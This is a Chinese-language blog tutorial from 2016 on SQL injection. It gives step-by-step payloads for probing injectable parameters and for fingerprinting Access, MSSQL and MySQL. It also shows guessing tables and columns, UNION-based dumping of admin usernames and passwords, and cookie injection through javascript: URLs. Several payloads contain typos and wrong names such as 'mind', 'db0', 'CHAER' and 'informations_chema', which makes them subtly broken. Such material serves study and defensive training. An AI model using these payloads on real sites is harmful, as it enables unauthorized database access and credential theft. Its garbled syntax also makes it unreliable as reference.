---
title: review of Network attack and defense
comments: true
date: 2016-09-19 01:02:38
categories: 扫盲教育
---
SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。

## SQL注入基础
### 1.试探 1=1，1=2
1. http://example.asp?id=49
2. http://example.asp?id=49 `and 1=1`
3. http://example.asp?id=49 `and 1=2`

可以注入的表现：
1. 正常显示
2. 正常显示
3. 提示BOF或EOF

不可注入的表现：
1. 正常显示
2. 程序定义的错误提示或提示类型转换时出错。
3. 同上

### 2.判断数据库类型
#### 加单引号
1. 错误提示含有JET（JET是ACCESS数据库的数据库引擎）
2. 错误提示中含有OLEDB（OLEDB是SQL SERVER使用的数据库引擎）

#### and user > 0
SQL SERVER出错：将nvarchar值“abc”转换数据类型为int的列时发生语法错误；“abc”正是变量user的值。SQL SERVER中有一个内置变量user，变量类型为nvarchar。

ACCESS的系统表[msysobjects]在web环境下读该表会提示“没有权限”；SQL SERVER的系统表[sysobjects]在web环境下不可正常读取。

#### `and (select count (*) from sysobjects) > 0`
SQL SERVER显示正常。ACCESS显示出错。

#### `and (select count (*) from msysobjects) > 0`
SQL SERVER显示正常。ACCESS显示没有权限。

### 3.猜表名
`and (select count (*) from admin) >= 0`
返回正常说明admin存在

### 4.猜字段
`and (select count (content) from admin) >= 0`
返回正常说明content字段存在

常用的猜字段函数
ACCESS: asc(字符)	返回字符的ascii
MSSQL: unicode(字符)	同上
ACCESS: char(数字)	返回ascii的字符
MSSQL: nchar()同上
ACCESS: mid(字符串,N,L)	返回字符串从N个字符起，长度为L的子字符串
MSSQL: substring(字符串,N,L)	同上
ACCESS,MSSQL: abc(数字)	返回数字的绝对值（猜汉字使用）
ACCESS,MSSQL: A between B and C	判断A是否在B和C之间

例`and (select asc(mind(password,1,1))from admin) > 100`
查询admin中password字段第1个字符串的ascii是否大于100

例`select * from article where articleid = '' union select * from user where userid = 1  `
第一个select执行后返回结果`title` `content`
`select * from article where articleid = ''`
第二个select执行后返回结果`username` `password`
`select * from user where userid = 1`
整个select执行后返回结果`username` `password`
如果前面查询为真，则同时返回两次查询的内容

1. 判断字段个数`order by`
2. 查表名`and (select count (*) from admin) >= 0`
3. 猜测admin表的字段个数（假如有三个字段id,user,password）`union select 1,2,3,4,5,6,7,8,9,10,* from admin`返回错误，`union select 1,2,3,* from admin`返回正常

inner join on: 指定返回两个表中匹配的行
`select * from admin as a inner join admin as b on a.id = b.id`返回一个表中的两个内容

上方`3`中没法显示admin中所有的字段信息，扩大显示范围，构造如下语句`and 1=2 union select 1,2,3,* from admin as a inner join admin as b on a.id = b.id`

`select * from admin inner join admin1 on admin.id = admin1.id`返回两个表内容

## MSSQL
1. 判断字段个数`order by 13`
2. 判断字段回显位`and 1=2 union all select 1,2,null,4,5,6,7,8,9,10,11,null,13`
3. 数据库版本`and 1=2 union select 1,@@version,null,4,5,6,7,8,9,10,11,null,13`
4. 当前数据库名`and 1=2 union all select 1,db_name(),null,4,5,6,7,8,9,10,11,null,13`
5. 所有数据库名（通过更改dbid，7以上的是用户数据库）`and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from master.db0.sysdatabases where dbid = 7 --`
6. 表名（更改top后的数字来查询）`and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAER(85) and name not in (select top 1 name from data.db0.sysobjects where xtype = CHAR(85))--`
7. 字段对应id`and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAR(85) and name not in (select top 7 name from data.bd0.sysobjects where xtype = CHAR(85))--`
8. 根据id查字段名`and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.syscolumns where ID = 12345 and name not in (select top 1 name from data.db0.syscolumns where ID = 12345)--`

## ASSESS
1. 试探`1=1` `1=2`
2. 环境监测`and ord(mid(version(),1,1))>51`正常则为mysql4以上版本，可以union查询`union select 1,version(),3`
3. 确定字段数`order by 13`
4. 判断精确字段`and 1=2 union select 1,2,3,4`正常返回在页面中
5. 爆数据库名`and 1=2 union select 1,user(),3,database()`正常返回在页面中
6. 爆表`and 1=2 union select 1,TABLE_NAME,3,4 from information_schema.tables where TABLE_SCHEMA = 'blah'`结果返回在2字段
7. 爆字段`and 1=2 union select 1,COLUMN_NAME,3,4 from informations_chema.COLUMN where TABLE_NAME='users'` `and 1=2 union select char(mid(COLUMN-NAME)),2,3,4 from information_schema.COLUMN where TABLE_NAME='users'`
8. 爆数据`and 1=2 union select 1,user,3,password form phptest.users`

## cookie注入
1. 在原地址加单引号
2. 去掉id值，页面出错，构造cookie语句：`javascript:alert(document.cookie="id="+escape("30 and 1=1"))`会弹窗
3. 关闭弹窗，去掉id访问，页面正常
4. 猜测字段`javascript:alert(document.cookie="id="+escape("30 order by 5"))`点击确认，去掉id访问，页面正常则正常
5. 判断回显位`javascript:alert(document.cookie="id="+escape("30 union select 1,2,3,4 from admin"))`点击确认，去掉id访问，页面正常则正常
6. 猜解user password字段`javascript:alert(document.cookie="id="+escape("30 union select 1,user,3,4 from admin"))`
